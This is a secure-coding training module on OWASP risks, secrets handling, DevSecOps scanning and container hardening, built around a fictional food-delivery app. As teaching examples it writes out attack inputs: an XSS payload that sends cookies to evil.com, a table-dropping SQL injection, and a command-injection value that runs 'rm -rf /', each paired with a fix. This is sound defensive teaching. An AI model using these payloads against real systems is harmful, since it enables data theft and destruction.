# Secure Engineering & DevSecOps
## Module 27 | Sustain Engineering Training | Day 30

---

## Agenda -- Day 30 (Half Day)

| # | Topic |
|---|-------|
| 01 | Why Security Matters for Sustain Engineers |
| 02 | OWASP Top 10 Web Application Risks |
| 03 | Secure Coding Practices |
| 04 | Secrets Management |
| 05 | DevSecOps Pipeline |
| 06 | Container Security |
| 07 | Lab: Fix Security Vulnerabilities |

---

## Why Security Matters for Sustain Engineers

### You Maintain the Code That Gets Attacked

```
┌─────────────────────────────────────────┐
│       SECURITY INCIDENT TIMELINE        │
│                                          │
│  Day 1:   Developer writes code          │
│  Day 30:  Code goes to production        │
│  Day 31-  Sustain engineer maintains it  │
│    365:   for the next 12 months         │
│                                          │
│  Day 180: Vulnerability discovered       │
│           WHO FIXES IT?                  │
│           ──▶ The sustain engineer ◀──   │
│                                          │
│  You own the security of live systems.   │
└─────────────────────────────────────────┘
```

> **FoodExpress:** 73% of security patches are applied by sustain engineers, not the original developers.

---

## Security by the Numbers

| Statistic | Impact |
|-----------|--------|
| 83% of apps have at least 1 vulnerability | Most code you maintain has security issues |
| Average breach costs $4.45M (2023) | One SQL injection can bankrupt a startup |
| 60% of breaches involve known, unpatched vulnerabilities | Sustain team's #1 security job: keep dependencies patched |
| MTTR for critical CVE: 60 days average | Too slow -- attackers exploit within hours |
| 95% of security incidents are human error | Secure coding practices prevent most issues |

---

## OWASP Top 10 (2021)

### The Most Critical Web Application Security Risks

| # | Risk | FoodExpress Example |
|---|------|-------------------|
| A01 | Broken Access Control | Customer can view other customers' orders |
| A02 | Cryptographic Failures | Passwords stored in plain text |
| A03 | Injection (SQL, XSS, Command) | SQL injection in menu search |
| A04 | Insecure Design | No rate limiting on password reset |
| A05 | Security Misconfiguration | Debug mode enabled in production |
| A06 | Vulnerable Components | Outdated log4j dependency |
| A07 | Authentication Failures | No account lockout after failed logins |
| A08 | Data Integrity Failures | No signature verification on software updates |
| A09 | Logging & Monitoring Failures | No alerts on suspicious login patterns |
| A10 | Server-Side Request Forgery | Menu image URL fetches internal resources |

---

## A03: Injection -- SQL Injection

### The Classic Attack

```java
// VULNERABLE: String concatenation in SQL
public List<Restaurant> search(String name) {
    String sql = "SELECT * FROM restaurants WHERE name = '" + name + "'";
    return jdbcTemplate.query(sql, restaurantMapper);
}

// Attack: name = "'; DROP TABLE restaurants; --"
// Executed: SELECT * FROM restaurants WHERE name = '';
//           DROP TABLE restaurants; --'
```

### Fix: Use Parameterized Queries

```java
// SECURE: Parameterized query -- input is data, never code
public List<Restaurant> search(String name) {
    String sql = "SELECT * FROM restaurants WHERE name = ?";
    return jdbcTemplate.query(sql, restaurantMapper, name);
}
// Attack input becomes: WHERE name = "'; DROP TABLE restaurants; --"
// Treated as a literal string, not SQL code
```

---

## A03: Injection -- Cross-Site Scripting (XSS)

### Stored XSS in Restaurant Reviews

```html
<!-- VULNERABLE: Directly rendering user input -->
<div class="review">
    <p>${review.comment}</p>
</div>

<!-- Attack: review.comment = '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>' -->
<!-- Every user viewing this review sends their cookie to the attacker -->
```

### Fix: Sanitize Output

```html
<!-- SECURE: HTML-escape user input -->
<div class="review">
    <p>${fn:escapeXml(review.comment)}</p>
</div>

<!-- Or in JavaScript frameworks: React auto-escapes by default -->
<!-- Angular: DomSanitizer -->
<!-- Express: Use 'helmet' middleware + template escaping -->
```

---

## A03: Injection -- Command Injection

### FoodExpress Report Generation

```java
// VULNERABLE: User input passed to shell command
public void generateReport(String date) {
    Runtime.getRuntime().exec("generate-report.sh " + date);
}

// Attack: date = "2026-01-01; rm -rf /"
// Executed: generate-report.sh 2026-01-01; rm -rf /
```

### Fix: Avoid shell commands; validate input

```java
// SECURE: Validate input, avoid shell execution
public void generateReport(String date) {
    // Validate date format
    LocalDate.parse(date, DateTimeFormatter.ISO_LOCAL_DATE);
    // Use ProcessBuilder with array (no shell interpretation)
    new ProcessBuilder("generate-report.sh", date).start();
}
```

---

## A01: Broken Access Control

### IDOR -- Insecure Direct Object Reference

```java
// VULNERABLE: No authorization check
@GetMapping("/api/v1/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId) {
    return orderRepository.findById(orderId).orElseThrow();
    // Any authenticated user can view ANY order by guessing the ID
}

// SECURE: Verify the order belongs to the authenticated user
@GetMapping("/api/v1/orders/{orderId}")
public Order getOrder(@PathVariable Long orderId, Authentication auth) {
    Order order = orderRepository.findById(orderId).orElseThrow();
    if (!order.getCustomerId().equals(auth.getUserId())) {
        throw new AccessDeniedException("Not your order");
    }
    return order;
}
```

> **FoodExpress:** A bug let customers change the order ID in the URL and view other customers' orders, including delivery addresses.

---

## A02: Cryptographic Failures

### Password Storage

```java
// TERRIBLE: Plain text
String stored = password;

// BAD: Simple hash (crackable with rainbow tables)
String stored = MessageDigest.getInstance("MD5").digest(password.getBytes());

// BAD: SHA-256 (fast = bad for passwords; attackers can try billions/sec)
String stored = MessageDigest.getInstance("SHA-256").digest(password.getBytes());

// GOOD: bcrypt (slow by design, includes salt)
String stored = BCrypt.hashpw(password, BCrypt.gensalt(12));

// VERIFY:
boolean matches = BCrypt.checkpw(inputPassword, storedHash);
```

| Algorithm | Speed (hashes/sec) | Suitable for Passwords? |
|-----------|-------------------|------------------------|
| MD5 | 25 billion | NO |
| SHA-256 | 5 billion | NO |
| bcrypt (cost=12) | 3,000 | YES |

---

## Secrets Management

### The Problem: Hardcoded Secrets

```java
// NEVER DO THIS -- found in 1 in 5 repos
public class PaymentService {
    private static final String API_KEY = "sk_live_abc123xyz789";
    private static final String DB_PASSWORD = "SuperSecret123!";
}
```

```yaml
# NEVER DO THIS in application.yml committed to Git
spring:
  datasource:
    password: ProductionPassword123!
```

---

## Secrets Management -- Solutions

### Hierarchy of Secret Storage

```
WORST:  Hardcoded in source code
BAD:    In config files committed to Git
OK:     In .env files (gitignored)
GOOD:   Environment variables injected at deploy time
BETTER: Secrets manager (AWS Secrets Manager, HashiCorp Vault)
BEST:   Short-lived, auto-rotating secrets with Vault
```

### Implementation

```yaml
# application.yml -- use environment variable references
spring:
  datasource:
    password: ${DB_PASSWORD}   # Injected at runtime

# Docker Compose
services:
  order-service:
    environment:
      DB_PASSWORD: ${DB_PASSWORD}  # From host environment or .env file
```

```bash
# .env file (NEVER committed to Git)
DB_PASSWORD=ProductionPassword123!
STRIPE_API_KEY=sk_live_abc123xyz789
```

---

## DevSecOps Pipeline

### Shift Left -- Find Vulnerabilities Early

```
┌──────┐   ┌──────┐   ┌──────┐   ┌──────┐   ┌──────┐
│ Code │──▶│Build │──▶│ Test │──▶│Deploy│──▶│Monitor│
└──┬───┘   └──┬───┘   └──┬───┘   └──┬───┘   └──┬───┘
   │          │          │          │          │
   ▼          ▼          ▼          ▼          ▼
 SAST      SCA/SBOM    DAST    Container   Runtime
 Secrets   License     Pen     Image       WAF
 Lint      Compliance  Test    Scan        SIEM
                                           Alerts
```

| Tool Type | What It Checks | Example Tools |
|-----------|---------------|---------------|
| SAST | Source code patterns | SonarQube, Checkmarx, Semgrep |
| SCA | Dependencies for CVEs | Snyk, Dependabot, OWASP Dependency-Check |
| DAST | Running app for vulns | OWASP ZAP, Burp Suite |
| Container Scan | Image vulnerabilities | Trivy, Docker Scout, Snyk Container |
| Secrets Scan | Hardcoded credentials | GitLeaks, TruffleHog |

---

## Dependency Scanning

### Why It Matters

```
Your Application
├── spring-boot-starter-web:3.1.0
│   ├── spring-webmvc:6.0.9
│   ├── tomcat-embed-core:10.1.8
│   │   └── [CVE-2023-XXXX] ← VULNERABILITY HERE
│   └── jackson-databind:2.15.2
├── log4j-core:2.14.0
│   └── [CVE-2021-44228] ← LOG4SHELL! Critical!
└── mysql-connector-java:8.0.28
    └── [CVE-2022-XXXX] ← SQL injection in driver
```

```bash
# Scan with Trivy
trivy fs --severity HIGH,CRITICAL .

# Scan with npm audit
npm audit

# Scan Docker image
docker scout cves foodexpress/order-service:1.0
```

---

## Container Security Best Practices

| Practice | Why | How |
|----------|-----|-----|
| Use minimal base images | Less attack surface | `FROM alpine`, `FROM distroless` |
| Run as non-root | Limit privilege escalation | `USER appuser` |
| Scan images for CVEs | Known vulnerabilities | `trivy image myapp:1.0` |
| Use read-only filesystem | Prevent runtime modifications | `--read-only` flag |
| Don't store secrets in images | Extractable from layers | Use env vars or secrets manager |
| Pin image versions | Reproducible, auditable | `FROM node:18.17.1` not `node:18` |
| Use multi-stage builds | No build tools in prod | Separate build and runtime stages |
| Set resource limits | Prevent DoS | `--memory 512m --cpus 1.0` |

---

## Container Security -- Dockerfile Scanning

```dockerfile
# Hadolint checks Dockerfiles for best practices
# Install: brew install hadolint (or Docker)

$ hadolint Dockerfile

Dockerfile:1 DL3006 Always tag the version of an image explicitly
Dockerfile:3 DL3008 Pin versions in apt-get install
Dockerfile:5 DL3009 Delete the apt-get lists after installing
Dockerfile:8 DL3002 Last user should not be root
```

---

## Input Validation Checklist

### Every Input Point Must Be Validated

| Input Source | Validation | FoodExpress Example |
|-------------|-----------|-------------------|
| Form fields | Type, length, format, range | Order quantity: integer, 1-99 |
| URL params | Whitelist allowed values | Sort field: only "name", "price", "rating" |
| HTTP headers | Sanitize, limit length | User-Agent: max 256 chars |
| File uploads | Type, size, scan for malware | Restaurant images: JPEG/PNG, max 5MB |
| API body | Schema validation | Order JSON: validate against schema |
| Query params | Parameterized queries | Menu search: never concatenate into SQL |
| Cookies | Signed, encrypted | Session cookie: HttpOnly, Secure, SameSite |

---

## Security Headers

### HTTP Headers Every FoodExpress Service Should Set

```
# Prevent XSS
Content-Security-Policy: default-src 'self'; script-src 'self'

# Prevent clickjacking
X-Frame-Options: DENY

# Prevent MIME type sniffing
X-Content-Type-Options: nosniff

# Force HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains

# Control referrer information
Referrer-Policy: strict-origin-when-cross-origin

# Disable browser features
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

```javascript
// Express.js: Use Helmet middleware
const helmet = require('helmet');
app.use(helmet());
```

---

## MCQ -- Quick Check 1

**Question:** You find this code in FoodExpress:
```java
String query = "SELECT * FROM users WHERE email = '" + email + "'";
```
What vulnerability is present?

A) XSS
B) SQL Injection
C) CSRF
D) Broken Authentication

> **Answer:** B -- String concatenation in SQL queries allows attackers to inject SQL code. Use parameterized queries instead.

---

## MCQ -- Quick Check 2

**Question:** Where should production database passwords be stored?

A) In the source code
B) In application.yml committed to Git
C) In environment variables or a secrets manager
D) In the README file

> **Answer:** C -- Secrets should never be in source code or version control. Use environment variables, secrets managers (Vault, AWS Secrets Manager), or Docker secrets.

---

## MCQ -- Quick Check 3

**Question:** Which password hashing algorithm is most suitable for production?

A) MD5
B) SHA-256
C) Base64 encoding
D) bcrypt with cost factor 12

> **Answer:** D -- bcrypt is deliberately slow (adjustable cost factor), includes a unique salt per hash, and is designed for password storage. MD5/SHA-256 are too fast.

---

## MCQ -- Quick Check 4

**Question:** A Docker image runs as root and has a read-write filesystem. What two fixes improve security?

A) Add more EXPOSE ports and use latest tag
B) Add `USER appuser` and run with `--read-only` flag
C) Use a larger base image and add SSH
D) Remove HEALTHCHECK and use host network

> **Answer:** B -- Running as non-root limits privilege escalation. Read-only filesystem prevents attackers from writing malicious files into the container.

---

## MCQ -- Quick Check 5

**Question:** What does SAST stand for and when does it run in the pipeline?

A) Security Analysis of Server Traffic -- runs in production
B) Static Application Security Testing -- runs during code/build phase
C) System Administration Security Tool -- runs during deployment
D) Software Architecture Security Test -- runs during design

> **Answer:** B -- SAST analyzes source code without executing it, finding vulnerabilities like SQL injection patterns during the build phase ("shift left").

---

## Lab Preview: Fix Security Vulnerabilities

### What You'll Fix

The FoodExpress codebase has **8 security vulnerabilities** across multiple files:

1. SQL Injection in restaurant search
2. XSS in review display
3. Hardcoded API key and database password
4. Missing input validation on order amounts
5. IDOR -- no authorization check on order retrieval
6. Weak password hashing (MD5)
7. Missing security headers
8. Debug mode enabled in production

> Files in `Labs/starter-code/`: Java service code, Node.js API, configuration files

---

## Key Takeaways

| # | Takeaway |
|---|----------|
| 1 | Sustain engineers fix 73% of security patches -- security is your job |
| 2 | OWASP Top 10: Injection, Broken Access Control, and Cryptographic Failures are the top 3 |
| 3 | Always use parameterized queries -- never concatenate user input into SQL |
| 4 | Never hardcode secrets -- use environment variables or secrets managers |
| 5 | bcrypt for passwords; MD5/SHA-256 are too fast and unsuitable |
| 6 | DevSecOps: SAST, SCA, DAST, container scanning -- automate in CI/CD |
| 7 | Container security: non-root, minimal images, pinned versions, read-only FS |

> **Next: Module 28 -- CI/CD with Jenkins**
